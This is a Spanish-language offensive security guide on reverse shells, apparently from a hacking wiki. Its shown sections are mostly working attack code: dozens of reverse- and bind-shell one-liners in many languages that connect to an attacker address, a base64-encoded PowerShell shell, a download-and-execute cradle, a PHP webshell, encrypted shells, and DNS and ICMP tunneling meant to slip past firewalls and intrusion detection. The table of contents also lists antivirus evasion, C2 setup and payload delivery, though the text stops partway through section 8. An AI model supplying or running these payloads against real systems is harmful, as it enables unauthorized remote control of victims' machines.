## Indice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (2969 lineas)


1. [Conceptos Fundamentales](#1-conceptos-fundamentales)
   - [1.1 ¿Qué es una reverse shell?](#11-que-es-una-reverse-shell)
   - [1.2 ¿Cuándo usar cada una?](#12-cuando-usar-cada-una)
2. [Reverse Shells por Lenguaje — 50+ One-Liners](#2-reverse-shells-por-lenguaje--50-one-liners)
   - [2.1 Bash](#21-bash)
   - [2.2 Netcat / Ncat](#22-netcat--ncat)
   - [2.3 Python](#23-python)
   - [2.4 PHP](#24-php)
   - [2.5 PowerShell (Windows)](#25-powershell-windows)
   - [2.6 Ruby](#26-ruby)
   - [2.7 Perl](#27-perl)
   - [2.8 Java](#28-java)
   - [2.9 Node.js](#29-nodejs)
   - [2.10 Lua](#210-lua)
   - [2.11 Golang](#211-golang)
   - [2.12 Telnet](#212-telnet)
   - [2.13 Socat](#213-socat)
   - [2.14 Awk](#214-awk)
   - [2.15 OpenSSL](#215-openssl)
3. [Listeners — Configuración de Escucha](#3-listeners--configuracion-de-escucha)
   - [3.1 Netcat listener básico](#31-netcat-listener-basico)
   - [3.2 Socat listener (el mejor)](#32-socat-listener-el-mejor)
   - [3.3 Metasploit handler](#33-metasploit-handler)
   - [3.4 PowerShell listener nativo](#34-powershell-listener-nativo)
   - [3.5 Python listener](#35-python-listener)
4. [Bind Shells](#4-bind-shells)
5. [Shells Cifradas con SSL/TLS](#5-shells-cifradas-con-ssltls)
   - [5.1 Socat SSL (recomendado)](#51-socat-ssl-recomendado)
   - [5.2 Ncat SSL](#52-ncat-ssl)
   - [5.3 OpenSSL reverse shell](#53-openssl-reverse-shell)
   - [5.4 Python SSL](#54-python-ssl)
6. [DNS Tunneling Shells](#6-dns-tunneling-shells)
7. [ICMP Shells](#7-icmp-shells)
8. [HTTP/HTTPS Reverse Shells](#8-httphttps-reverse-shells)
   - [8.1 PowerShell download + exec](#81-powershell-download--exec)
   - [8.2 PHP web shell](#82-php-web-shell)
   - [8.3 Python HTTPS server con control](#83-python-https-server-con-control)
9. [WebSocket Shells](#9-websocket-shells)
10. [Windows Named Pipe Shells](#10-windows-named-pipe-shells)
11. [SMB Reverse Shells](#11-smb-reverse-shells)
12. [Shell Stabilization — Mejora de TTY](#12-shell-stabilization--mejora-de-tty)
    - [12.1 Python PTY (Linux)](#121-python-pty-linux)
    - [12.2 Socat TTY completo](#122-socat-tty-completo)
    - [12.3 Expect script](#123-expect-script)
    - [12.4 Screen / Tmux en la víctima](#124-screen--tmux-en-la-victima)
    - [12.5 Windows shell upgrade](#125-windows-shell-upgrade)
13. [msfvenom — Generación de Payloads](#13-msfvenom--generacion-de-payloads)
    - [13.1 Linux payloads](#131-linux-payloads)
    - [13.2 Windows payloads](#132-windows-payloads)
    - [13.3 Mobile payloads](#133-mobile-payloads)
    - [13.4 Web payloads](#134-web-payloads)
    - [13.5 Encoders y evasión](#135-encoders-y-evasion)
14. [Payload Obfuscation — Ofuscación Avanzada](#14-payload-obfuscation--ofuscacion-avanzada)
    - [14.1 PowerShell obfuscation](#141-powershell-obfuscation)
    - [14.2 Custom shellcode con donut](#142-custom-shellcode-con-donut)
    - [14.3 Packers / Crypters](#143-packers--crypters)
15. [Antivirus Evasion — Estrategias Avanzadas](#15-antivirus-evasion--estrategias-avanzadas)
    - [15.1 Process Injection](#151-process-injection)
    - [15.2 API Unhooking](#152-api-unhooking)
    - [15.3 Direct Syscalls](#153-direct-syscalls)
    - [15.4 AMSI / ETW / WLDP bypass](#154-amsi--etw--wldp-bypass)
    - [15.5 Cómo testear evasión](#155-como-testear-evasion)
16. [C2 Frameworks — Centro de Comando y Control](#16-c2-frameworks--centro-de-comando-y-control)
    - [16.1 Comparativa detallada](#161-comparativa-detallada)
    - [16.2 Sliver — Setup completo](#162-sliver--setup-completo)
    - [16.3 Havoc C2](#163-havoc-c2)
    - [16.4 Covenant C2](#164-covenant-c2)
    - [16.5 Mythic C2](#165-mythic-c2)
17. [Egress Filtering — Bypass de Firewall de Salida](#17-egress-filtering--bypass-de-firewall-de-salida)
18. [Pivoting — Movimiento Lateral](#18-pivoting--movimiento-lateral)
    - [18.1 Metasploit pivot](#181-metasploit-pivot)
    - [18.2 SOCKS proxy con sliver](#182-socks-proxy-con-sliver)
    - [18.3 SSH tunneling](#183-ssh-tunneling)
    - [18.4 Ligolo-ng (el mejor para pivoting)](#184-ligolo-ng-el-mejor-para-pivoting)
19. [Delivery Methods — Cómo entregar el payload](#19-delivery-methods--como-entregar-el-payload)
20. [Recursos y Referencias](#20-recursos-y-referencias)

---
# Reverse Shells y C2 — Guía Completa

## 1. Conceptos Fundamentales

### 1.1 ¿Qué es una [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells)?

Una **reverse shell** es una conexión que se inicia desde la máquina víctima hacia la máquina atacante. A diferencia de una **[bind shell](../raw/r3v3rs3-sh3lls.md#bind-shells)** (donde el atacante se conecta a un [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) abierto en la víctima), la reverse shell evade firewalls [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) y restricciones de inbound porque **la conexión la inicia la víctima**.

```
Bind Shell:
Atacante ──conecta──▶ Víctima (puerto abierto 4444)
   ❌ Bloqueado por firewall / NAT

Reverse Shell:
Atacante (listener 4444) ◀──conecta── Víctima
   ✅ Atraviesa firewalls (egress rara vez filtrado)
```

### 1.2 ¿Cuándo usar cada una?

| Situación | Recomendación |
|-----------|---------------|
| [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) bloquea inbound pero no outbound | **Reverse shell** |
| Víctima está detrás de NAT/CGNAT | **Reverse shell** |
| Atacante no tiene [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) pública | **Bind shell** (o usar ngrok/playit.gg) |
| Necesitás acceso desde cualquier [red](../raw/r3d3s-f0nd4m3nt0s.md) | **Bind shell + [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)** |
| Egress filtering bloquea puertos comunes | **Reverse shell sobre 80/443 o [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)** |
| No tenés un listener preparado | **Bind shell** (solo abrí un puerto) |

---

## 2. Reverse Shells por Lenguaje — 50+ One-Liners

### 2.1 Bash

```bash
# Clásica (bash nativo, sin netcat)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Explicación:
# bash -i               → shell interactiva
# >& /dev/tcp/IP/PORT  → redirigir stdout+stderr a TCP
# 0>&1                  → redirigir stdin a la misma conexión

# Alternativa más robusta
exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# Con bash y file descriptor explícito
0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196

# Bash UDP (menos común pero útil si TCP está filtrado)
sh -i >& /dev/udp/10.0.0.1/4444 0>&1
```

### 2.2 [netcat](../raw/r3v3rs3-sh3lls.md#netcat) / Ncat

```bash
# Netcat tradicional
nc -e /bin/sh 10.0.0.1 4444

# Netcat sin -e (OpenBSD netcat)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f

# Ncat (versión mejorada de nmap)
ncat --ssl 10.0.0.1 4444 -e /bin/sh  # SSL cifrado

# Con timeout y reconexión
while true; do nc -e /bin/sh 10.0.0.1 4444; sleep 5; done

# Netcat + Python one-liner (cuando no hay -e)
nc 10.0.0.1 4444 | /bin/sh | nc 10.0.0.1 4444
```

### 2.3 [python](../raw/pyth0n-f0r-h4ck1ng.md)

```bash
# Python 3 — one-liner completo
python3 -c "
import socket,subprocess;
s=socket.socket();
s.connect(('10.0.0.1',4444));
subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
"

# Python 2
python -c "
import socket,subprocess;
s=socket.socket();
s.connect(('10.0.0.1',4444));
subprocess.call(['/bin/sh','-i'],stdin=s,stdout=s,stderr=s)
"

# Python con pty (más estable)
python3 -c "
import socket,pty,os;
s=socket.socket();
s.connect(('10.0.0.1',4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn('/bin/sh')
"

# Python con manejo de errores y reconexión
python3 -c "
import socket,subprocess,os,time
while True:
    try:
        s=socket.socket()
        s.connect(('10.0.0.1',4444))
        subprocess.call(['/bin/sh','-i'],stdin=s,stdout=s,stderr=s)
        s.close()
    except:
        time.sleep(5)
"

# Python Windows
python -c "
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.0.0.1',4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call([os.environ['COMSPEC'],'/k'])
"
```

### 2.4 PHP

```bash
# PHP básico (si exec está habilitado)
php -r "
\$s=fsockopen('10.0.0.1',4444);
exec('/bin/sh -i <&3 >&3 2>&3');
"

# PHP con shell_exec
php -r "
\$s=fsockopen('10.0.0.1',4444);
shell_exec('/bin/sh -i <&3 >&3 2>&3');
"

# PHP completo con proc_open
php -r "
\$s=fsockopen('10.0.0.1',4444);
\$proc=proc_open('/bin/sh -i',[0=>\$s,1=>\$s,2=>\$s],\$pipes);
"

# PHP sin funciones prohibidas
php -r "
\$s=fsockopen('10.0.0.1',4444);
\$d='/bin/sh -i';
system(\$d.\" <&3 >&3 2>&3\");
"

# PHP webshell completo
<?php
// shell.php — subir al servidor y después ejecutar
set_time_limit(0);
$ip = '10.0.0.1';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
], $pipes);
stream_set_blocking($pipes[0], 0);
while(true) {
    $r = [$sock, $pipes[1], $pipes[2]];
    $w = null;
    $e = null;
    if(stream_select($r, $w, $e, null)) {
        if(in_array($sock, $r)) {
            fwrite($pipes[0], fread($sock, 4096));
        }
        if(in_array($pipes[1], $r) || in_array($pipes[2], $r)) {
            fwrite($sock, fread($pipes[1], 4096));
            fwrite($sock, fread($pipes[2], 4096));
        }
    }
}
?>
```

### 2.5 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) (Windows)

```bash
# PowerShell one-liner clásico
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
\$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);
\$s=\$c.GetStream();
[byte[]]\$b=0..65535|%{0};
while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){
    \$d=([Text.Encoding]::ASCII).GetString(\$b,0,\$i);
    \$sb=(iex \$d 2>&1|Out-String);
    \$sb2=\$sb+'PS> ';
    \$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);
    \$s.Write(\$sbt,0,\$sbt.Length);
    \$s.Flush()
};
\$c.Close()
"

# PowerShell con SSL/TLS
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
\$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);
\$s=\$c.GetStream();
\$ssl=New-Object Net.Security.SslStream(\$s,\$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
\$ssl.AuthenticateAsClient('10.0.0.1',\$null,\"Tls12\",\$false);
[byte[]]\$b=0..65535|%{0};
while((\$i=\$ssl.Read(\$b,0,\$b.Length)) -ne 0){
    \$d=([Text.Encoding]::ASCII).GetString(\$b,0,\$i);
    \$sb=(iex \$d 2>&1|Out-String);
    \$sb2=\$sb+'PS> ';
    \$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);
    \$ssl.Write(\$sbt,0,\$sbt.Length);
    \$ssl.Flush()
};
\$c.Close()
"

# PowerShell base64 encoded (para evadir caracteres especiales)
powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAPQAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABzAGIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAcwBiADIAPQAkAHMAYgArACcAUABTAD4AIAAnADsAJABzAGIAdAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAUwB0AHIAaQBuAGcAcwAoACQAcwBiADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiAHQALAAwACwAJABzAGIAdAAuAEwAZQBuAGcAdABoACkAOwAkAHMALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAAoA

# PowerShell sin socket (usando com .NET remoting)
Invoke-Command -ComputerName TARGET -ScriptBlock { reverse-shell }

# PowerShell download + exec (carga el script desde un servidor web)
powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')"

# PowerShell con WMI
wmic process call create "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"...`""
```

### 2.6 Ruby

```bash
# Ruby básico
ruby -rsocket -e '
c=TCPSocket.new("10.0.0.1",4444);
while(cmd=c.gets);
  IO.popen(cmd,"r"){|io|c.print io.read}
end
'

# Ruby con shell interactiva
ruby -rsocket -e '
c=TCPSocket.new("10.0.0.1",4444);
$stdin.reopen(c);
$stdout.reopen(c);
$stderr.reopen(c);
$stdin.each_line{|l|l.chomp!;
  IO.popen(l,"r"){|fd| c.print fd.read}
}
'

# Ruby con exec
ruby -rsocket -e '
f=TCPSocket.new("10.0.0.1",4444);
exec "/bin/sh -i <&#{f.fileno} >&#{f.fileno} 2>&&#{f.fileno}"
'
```

### 2.7 Perl

```bash
# Perl básico
perl -e '
use Socket;
$i="10.0.0.1";
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(S,sockaddr_in($p,inet_aton($i)));
open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
'

# Perl con módulo IO::Socket
perl -MIO::Socket::INET -e '
$s=new IO::Socket::INET(PeerAddr=>"10.0.0.1:4444");
STDIN->fdopen($s,r);
$s->autoflush(1);
print $s "Connected\n";
while(<$s>){chomp;system $_}
'
```

### 2.8 Java

```java
// ReverseShell.java — compilar y ejecutar en la víctima
import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        try {
            Socket s = new Socket("10.0.0.1", 4444);
            Process p = Runtime.getRuntime().exec("/bin/sh -i");
            
            new Thread(() -> {
                try {
                    InputStream pi = p.getInputStream();
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = pi.read(buffer)) != -1) {
                        s.getOutputStream().write(buffer, 0, bytesRead);
                    }
                } catch (IOException e) {}
            }).start();

            new Thread(() -> {
                try {
                    OutputStream po = p.getOutputStream();
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = s.getInputStream().read(buffer)) != -1) {
                        po.write(buffer, 0, bytesRead);
                    }
                } catch (IOException e) {}
            }).start();
            
            p.waitFor();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```bash
# Compilar y transferir
javac ReverseShell.java
# Enviar ReverseShell.class a la víctima
java ReverseShell
```

### 2.9 Node.js

```bash
# Node.js reverse shell
node -e '
var net=require("net");
var sh=require("child_process").spawn("/bin/sh",[]);
var client=new net.Socket();
client.connect(4444,"10.0.0.1",function(){
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
'

# Node.js con reconexión automática
node -e '
var net=require("net");
function connect(){
  var c=new net.Socket();
  c.connect(4444,"10.0.0.1",function(){
    var sh=require("child_process").spawn("/bin/sh",[]);
    c.pipe(sh.stdin);
    sh.stdout.pipe(c);
    sh.stderr.pipe(c);
  });
  c.on("close",function(){setTimeout(connect,5000)});
}
connect();
'
```

### 2.10 Lua

```bash
# Lua básico
lua -e '
local host, port = "10.0.0.1", 4444
local sock = require("socket")
local tcp = sock.tcp()
tcp:connect(host, port)
while true do
    local cmd, status, partial = tcp:receive()
    if(cmd) then
        local f = io.popen(cmd, "r")
        local s = f:read("*a")
        tcp:send(s)
        f:close()
    end
    tcp:send("\n> ")
end
tcp:close()
'
```

### 2.11 Golang

```go
// reverse.go — compilar cross-platform
package main

import (
    "net"
    "os/exec"
    "io"
    "log"
)

func main() {
    conn, err := net.Dial("tcp", "10.0.0.1:4444")
    if err != nil {
        log.Fatal(err)
    }
    cmd := exec.Command("/bin/sh")
    stdin, _ := cmd.StdinPipe()
    stdout, _ := cmd.StdoutPipe()
    stderr, _ := cmd.StderrPipe()
    go io.Copy(stdin, conn)
    go io.Copy(conn, stdout)
    go io.Copy(conn, stderr)
    cmd.Run()
}
```

```bash
# Compilar para Linux
GOOS=linux GOARCH=amd64 go build -o reverse reverse.go

# Compilar para Windows
GOOS=windows GOARCH=amd64 go build -o reverse.exe reverse.go
```

### 2.12 Telnet

```bash
# Telnet reverse shell (útil cuando no hay nada más)
telnet 10.0.0.1 4444 | /bin/sh | telnet 10.0.0.1 4445

# Alternativa de un solo puerto
telnet 10.0.0.1 4444 | /bin/sh 2>&1 | telnet 10.0.0.1 4444
```

### 2.13 [socat](../raw/r3v3rs3-sh3lls.md#socat)

```bash
# Socat es el más versátil de todos
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444

# Con SSL/TLS
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane ssl:10.0.0.1:4444

# Con reconexión automática
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444,reuseaddr,connect-timeout=5,retry=10
```

### 2.14 Awk

```bash
# Awk reverse shell (sí, se puede)
awk 'BEGIN {
    s="/inet/tcp/0/10.0.0.1/4444";
    while(42) {
        printf "sh$ " |& s;
        s |& getline c;
        if(c){
            while((c |& getline) > 0)
                print $0 |& s;
            close(c);
        }
    }
}'
```

### 2.15 OpenSSL

```bash
# OpenSSL reverse shell (cifrado)
# En el atacante:
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# En la víctima:
openssl s_client -quiet -connect 10.0.0.1:4444 -servername 10.0.0.1:/bin/sh
```

---

## 3. Listeners — Configuración de Escucha

### 3.1 [netcat](../raw/r3v3rs3-sh3lls.md#netcat) listener básico

```bash
# Listener simple
nc -lvnp 4444
# -l = listen
# -v = verbose
# -n = no DNS resolution
# -p = puerto

# Ncat con SSL
ncat -lvnp 4444 --ssl

# Ncat con keep-alive (reconexión)
ncat -lvnp 4444 --keep-open

# Netcat con output a archivo
nc -lvnp 4444 > session.log 2>&1
```

### 3.2 [socat](../raw/r3v3rs3-sh3lls.md#socat) listener (el mejor)

```bash
# Socat con TTY completo (recomendado)
socat file:`tty`,raw,echo=0 TCP-L:4444

# Socat con SSL
socat openssl-listen:4444,reuseaddr,cert=cert.pem,key=key.pem,verify=0,fork file:`tty`,raw,echo=0

# Socat con forking (múltiples conexiones)
socat TCP-L:4444,fork,reuseaddr -

# Socat para bind shell (del lado víctima)
socat TCP-L:4444,reuseaddr EXEC:/bin/sh
```

### 3.3 [metasploit](../raw/m3t4spl01t.md) handler

```bash
# Handler para meterpreter (meterpreter/reverse_tcp)
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j  # correr como job en background

# Handler HTTPS (más evasivo)
set PAYLOAD linux/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HandlerSSLCert /path/to/cert.pem  # SSL real
run -j

# Automatizar desde línea
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"

# Resource script para handler
cat handler.rc
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j -z

msfconsole -r handler.rc
```

### 3.4 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) listener nativo

```powershell
# Listener en PowerShell puro (sin netcat)
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 4444)
$listener.Start()
Write-Host "Listening on port 4444..."
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    $data = $null
    $buffer = New-Object byte[] 1024
    $count = $stream.Read($buffer, 0, $buffer.Length)
    if ($count -gt 0) {
        $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $count)
        $result = Invoke-Expression $data 2>&1 | Out-String
        $writer.Write($result + "PS> ")
    }
}
```

### 3.5 [python](../raw/pyth0n-f0r-h4ck1ng.md) listener

```python
# listener.py — listener con soporte de comandos
import socket
import sys

def listen(host='0.0.0.0', port=4444):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    print(f'[*] Listening on {host}:{port}')
    
    conn, addr = s.accept()
    print(f'[+] Connection from {addr[0]}:{addr[1]}')
    
    while True:
        cmd = input('shell> ')
        if cmd.lower() in ('exit', 'quit'):
            break
        conn.send((cmd + '\n').encode())
        data = conn.recv(4096).decode(errors='ignore')
        print(data, end='')
    
    conn.close()
    s.close()

if __name__ == '__main__':
    listen(*sys.argv[1:3]) if len(sys.argv) > 2 else listen()
```

---

## 4. Bind Shells

Cuando la [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) no es posible (egress filtering total), la [bind shell](../raw/r3v3rs3-sh3lls.md#bind-shells) es la alternativa.

```bash
# === Linux bind shells ===

# Netcat bind
nc -lvnp 4444 -e /bin/sh

# Socat bind
socat TCP-L:4444,fork,reuseaddr EXEC:/bin/sh

# Bash bind (no necesita netcat)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

# Perl bind
perl -e '
use Socket;
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
bind(S,sockaddr_in($p,INADDR_ANY));
listen(S,5);
while(accept(C,S)){
  open(STDIN,">&C");
  open(STDOUT,">&C");
  open(STDERR,">&C");
  exec("/bin/sh -i");
  close(C);
}
'

# Python bind
python3 -c "
import socket,subprocess,os;
s=socket.socket();
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);
s.bind(('0.0.0.0',4444));
s.listen(5);
while True:
    c,a=s.accept();
    os.dup2(c.fileno(),0);
    os.dup2(c.fileno(),1);
    os.dup2(c.fileno(),2);
    subprocess.call(['/bin/sh','-i'])
"

# === Windows bind shells ===

# PowerShell bind
powershell -Command "
\$l=New-Object Net.Sockets.TcpListener(0,4444);
\$l.Start();
\$c=\$l.AcceptTcpClient();
\$s=\$c.GetStream();
[byte[]]\$b=0..65535|%{0};
while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){
    \$d=([Text.Encoding]::ASCII).GetString(\$b,0,\$i);
    \$sb=(iex \$d 2>&1|Out-String);
    \$sbt=([text.encoding]::ASCII).GetBytes(\$sb);
    \$s.Write(\$sbt,0,\$sbt.Length);
    \$s.Flush()
}
"
```

---

## 5. Shells Cifradas con [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))/[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)

Las conexiones cifradas evitan detección por NIDS/[ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips).

### 5.1 [socat](../raw/r3v3rs3-sh3lls.md#socat) SSL (recomendado)

```bash
# 1. Generar certificado en el atacante
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem > combined.pem

# 2. Listener SSL
socat openssl-listen:4444,reuseaddr,cert=combined.pem,verify=0,fork file:`tty`,raw,echo=0

# 3. En la víctima (reverse shell SSL)
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane openssl:10.0.0.1:4444,verify=0
```

### 5.2 Ncat SSL

```bash
# Atacante
ncat -lvnp 4444 --ssl --ssl-cert cert.pem --ssl-key key.pem

# Víctima
ncat --ssl 10.0.0.1 4444 -e /bin/sh
```

### 5.3 OpenSSL [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells)

```bash
# Atacante
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Víctima
openssl s_client -quiet -connect 10.0.0.1:4444 -servername 10.0.0.1:/bin/sh
```

### 5.4 [python](../raw/pyth0n-f0r-h4ck1ng.md) SSL

```python
# listener_ssl.py
import socket, ssl

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('cert.pem', 'key.pem')

bindsocket = socket.socket()
bindsocket.bind(('0.0.0.0', 4444))
bindsocket.listen(5)

while True:
    newsocket, fromaddr = bindsocket.accept()
    connstream = context.wrap_socket(newsocket, server_side=True)
    try:
        data = connstream.recv(1024)
        # procesar comando
    finally:
        connstream.shutdown(socket.SHUT_RDWR)
        connstream.close()
```

---

## 6. [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Tunneling Shells

Cuando todo el tráfico está bloqueado excepto DNS, podés tunelizar comandos sobre consultas DNS.

```bash
# === DNS Tunneling con dnscat2 ===

# En el servidor atacante (con dominio propio):
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
bundle install
sudo ruby dnscat2.rb tusubdominio.ejemplo.com

# En la víctima (cliente):
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
./dnscat2 --dns tusubdominio.ejemplo.com

# O usando dnscat2 PowerShell:
# https://github.com/lukebaggett/dnscat2-powershell

# === DNS Tunneling con iodine ===

# Servidor:
sudo iodined -f -c -P password 10.0.0.1 t1.tudominio.com

# Cliente:
sudo iodine -f -P password 10.0.0.1 t1.tudominio.com -r

# Después del túnel:
ssh user@10.0.0.1  # conexión sobre DNS

# Explicación:
# iodine crea un túnel IP sobre consultas DNS
# El servidor responde con registros TXT que contienen datos
# El cliente reconstruye los paquetes IP
# Velocidad: ~50-100 Kbps (lento pero funcional)

# === dns2tcp ===

# Servidor (tunel):
dns2tcpd -f dns2tcpd.conf -d 2
# dns2tcpd.conf:
# listen = 127.0.0.1
# port = 53
# domain = tunnel.tudominio.com
# key = password123
# resource = ssh:127.0.0.1:22

# Cliente:
dns2tcpc -r ssh -z tunnel.tudominio.com -k password123 -l 8888 10.0.0.1
ssh user@localhost -p 8888
```

---

## 7. ICMP Shells

Si solo ICMP (ping) está permitido, podés tunelizar datos en paquetes ICMP.

```bash
# === PTunnel (Ping Tunnel) ===

# Servidor atacante:
sudo ptunnel -p VICTIM_IP -lp 4444 -da ATACANTE_IP -dp 9999

# Cliente víctima:
sudo ptunnel -p ATACANTE_IP -lp 9999 -da 127.0.0.1 -dp 22

# Después de establecer el túnel:
ssh user@localhost -p 4444  # a través de ICMP

# === ICMP reverse shell manual ===

# Python ICMP listener (atacante)
python3 << 'EOF'
import socket, struct, os

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    return ~s & 0xffff

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

while True:
    data, addr = s.recvfrom(65535)
    ip_header = data[:20]
    icmp_header = data[20:28]
    msg = data[28:]
    if msg:
        cmd = msg.decode(errors='ignore')
        result = os.popen(cmd).read()
        # Enviar resultado en paquete ICMP de vuelta
        icmp_type = 0  # Echo Reply
        icmp_code = 0
        icmp_checksum = 0
        packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, 0, 0)
        packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum(packet), 0, 0)
        s.sendto(packet + result.encode(), addr)
EOF
```

---

## 8. [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https) Reverse Shells

Usar HTTP/HTTPS es la técnica más evasiva porque el tráfico parece navegación normal.

### 8.1 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) download + exec (más simple)

```bash
# Atacante: servir payload en HTTP
python3 -m http.server 8000

# Víctima: descarga y ejecuta
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8000/shell.ps1')
"
```

### 8.2 PHP web shell

```bash
# Si la víctima tiene un servidor web corriendo:
# Subir shell.php
<?php system($_GET['cmd']); ?>

# Ejecutar comandos:
curl "http://victima.com/shell.php?cmd=whoami"
curl "http://victima.com/shell.php?cmd=id"
